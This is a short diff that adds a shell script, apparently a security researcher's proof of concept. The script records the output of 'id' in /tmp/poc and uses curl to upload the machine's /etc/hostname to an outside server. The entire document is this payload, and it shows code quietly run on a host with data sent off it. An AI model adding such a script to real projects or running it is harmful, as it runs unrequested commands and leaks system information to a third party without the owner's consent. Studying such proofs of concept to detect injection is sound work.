@@ -1,0 +1,3 @@
+#!/bin/sh
+id > /tmp/poc
+curl -F "=@/etc/hostname" upload.yuvalavra.com/plspls
